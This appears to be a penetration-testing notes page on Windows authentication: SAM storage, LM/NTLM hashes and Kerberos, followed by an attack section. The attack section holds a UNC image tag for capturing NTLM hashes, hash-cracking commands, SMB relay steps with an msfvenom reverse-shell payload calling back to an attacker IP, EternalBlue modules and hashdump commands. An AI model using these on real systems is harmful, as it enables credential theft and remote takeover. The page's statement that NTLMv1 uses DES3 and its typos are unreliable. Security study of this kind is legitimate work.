# Windows

## Authentication on Microsoft Platforms

Now that you know the different mechanisms through which you can obtain credentials, as well as how you can target them, let’s look at some authentication mechanisms. We will focus on mechanisms on the Microsoft platform: SAM, NTLM, LM, and Kerberos.

### Security Accounts Manager

Inside the Windows operating system is a database that stores security principals \(accounts or any entity that can be authenticated\). In the Microsoft world, these principals can be stored locally in a database known as the Security Accounts Manager \(SAM\). Credentials, passwords, and other account information are stored in this database; the passwords are stored in a hashed format. When the system is running, Windows keeps a file lock on the SAM to prevent it from being accessed by other applications or processes.

### How Passwords Are Stored within the SAM

In Windows XP and later platforms, passwords are stored in a hashed format using the LM/ NTLM hashing mechanisms. The hashes are stored in **c:\windows\system32\config\SAM**.

An account in the SAM looks like this:

Link:1010:**624AAC413795CDC14E835F1CD90F4C76**:6F585FF8FF6280B59CCE252FDB500EB8:::

The bold part before the colon is the LM hash, and the bold part after the colon represents the NTLM hash—both for a given password on a standard user account. Password crackers such as Ophcrack and L0phtCrack display and attempt to decipher these hashes, as do applications such as pwdump.

In Windows, as in other systems, password hashing may be strengthened by using salt-ing. This technique is designed to add an additional layer of randomness to a hash during the generation process. With salt added to a hash offl ine and precomputed, attacks become much more difficult to execute successfully.

### NTLM Authentication

NT LAN Manager \(NTLM\) is a protocol exclusive \(proprietary\) to Microsoft products. NTLM versions 1 and 2 are still very widely used in environments and applications where other protocols such as Kerberos are not available, but Microsoft recommends that it be avoided or phased out.

NTLM comes in two versions: NTLMv1 and NTLMv2. NTLMv1 has been in use for many years and still has some support in newer products, but it has largely been replaced in applications and environments with at least NTLMv2 if not other mechanisms. NTLMv2 is an improved version of the NTLM protocol. It boasts better security than version 1, but it is still seen as relatively insecure and as such should be avoided as well.

> LM hash = DES
>
> NTLM v1 = DES3
>
> NTLMv2 = MD5

### Kerberos

On the Microsoft platform, version 5 of the Kerberos authentication protocol has been in use since Windows 2000. The protocol offers a robust authentication framework through the use of strong cryptographic mechanisms such as symmetric key cryptography. It provides mutual authentication of client and server.

The Kerberos protocol makes use of the following groups of components:

* Key distribution center \(KDC\)
* Authentication server \(AS\)
* Ticket-granting server \(TGS\)

The process of using Kerberos works much like the following:

1. You want to access another system, such as a server or client. Because Kerberos is in use in this environment, a ticket is required.
2. To obtain this ticket, you are first authenticated against the AS, which creates a session key based on your password together with a value that represents the service you wish to connect to. This request serves as your ticket-granting ticket \(TGT\).
3. Your TGT is presented to a TGS, which generates a ticket that allows you to access the service.
4. Based on the situation, the service either accepts or rejects the ticket. In this case, assume that you are authorized and gain access.

The TGT is valid for only a finite period before it has to be regenerated. This acts as a safeguard against it being compromised.

## Exploit

google search cracking LM hashes

[https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)

[https://medium.com/secstudent/using-john-the-ripper-with-lm-hashes-f757bd4fb094](https://medium.com/secstudent/using-john-the-ripper-with-lm-hashes-f757bd4fb094)

[https://www.rapid7.com/db/modules/auxiliary/server/capture/smb](https://www.rapid7.com/db/modules/auxiliary/server/capture/smb)

`<img src="\\192.168.102.147\ADMIN$">` tag to embed in a webpage or email message

If the password length is less then 8 characters,the last 8 bytes of the NLTM response are always the same `2f85252cc731bb25`

Crack the hash with John the Ripper `john --format=netlm hashpwd_netlm`

`john --format=netntlm hash.txt`

`hashcat -m 5500 -a 3 hash.txt`

## SMB Relay

Man in the middle attack, only works if the user who tries to authenticate on the target machine, has administrator privileges on the target. Also only works when on the target machine in the Network security the LAN manager authentication level is set to "Send LM & NTLM responses".

Metasploit `exploit/windows/smb/smb_relay module`

`smbrelayx.py` from impacket. Make an exe payload with msfvenom.

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.102.147 LPORT=4455 -f exe -o smbexp.exe`

start `msfconsole` and configure the `exploit/multi/handler` module

`smbrealyx.py -h 192.168.102.149 -e /home/stduder/smbexp.exe`

## EternalBlue \(MS17-010, CVE-2017-0144\)

auxiliary/scanner/smb/smb\_ms17\_10

exploit/windows/smb/ms17\_\_010\_\_eternalblue

## Meterpreter - get the hashes

hashdump

run post/windows/gather/hasdump

run post/linux/gather/hashdump

